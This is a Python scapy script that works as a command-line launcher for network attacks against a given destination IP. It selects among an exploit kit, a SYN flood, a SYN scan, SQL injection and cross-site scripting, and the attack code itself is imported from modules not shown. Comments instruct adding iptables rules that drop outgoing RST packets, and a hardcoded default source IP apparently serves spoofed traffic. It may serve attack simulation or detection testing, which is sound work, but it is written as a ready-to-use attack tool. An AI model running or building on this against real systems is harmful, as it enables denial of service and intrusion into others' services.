#!/usr/bin/python
from scapy.all import *

# run "sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST --sport 80 -j DROP"
# run "sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST --dport 80 -j DROP"

import argparse
import exploit_kit
import syn_flood
import sql
import xss
import syn_scan

# attacks keywords
print("Attacks Keywords:\nek - Exploit Kit\nflood - SYN Flood\nscan - SYN Scan\nsql - SQL Injection\nxss - Cross Site Scripting (XSS)\n")

# let the user select attack
parser = argparse.ArgumentParser(description='Select one of the following keywords: ek, flood, scan, sql, xss')
parser.add_argument('-a', help='Attack: ek, flood, scan, sql, xss', required=True)
parser.add_argument('-dip', help='Destination IP', required=True)
parser.add_argument('-sip', help='Source IP')
parser.add_argument('-dport', help='Destination Port (default is 80)')
parser.add_argument('-intf', help='Interface (required for ek attack)')
args = parser.parse_args()

# variables
destination_ip = args.dip
attack_interface = args.intf
if args.dport != None:
    destination_port = int(args.dport)
else:
    destination_port = 80

if args.sip != None:
    source_ip = args.sip
else:
    source_ip = "173.252.87.25"


# run the attack
if args.a == "ek":
    print("running exploit kit")
    exploit_kit.ek()
elif args.a == "flood":
    print("running syn food")
    syn_flood.sf(destination_ip, destination_port)
elif args.a == "scan":
    print("running syn scan")
    syn_scan.scan(destination_ip)
elif args.a == "sql":
    print("running sql injection")
    sql.sql(destination_ip)
elif args.a == "xss":
    print("running xss")
    xss.xss(destination_ip)
else:
    msg = "Not a valid attack keyword"
    raise argparse.ArgumentTypeError(msg)
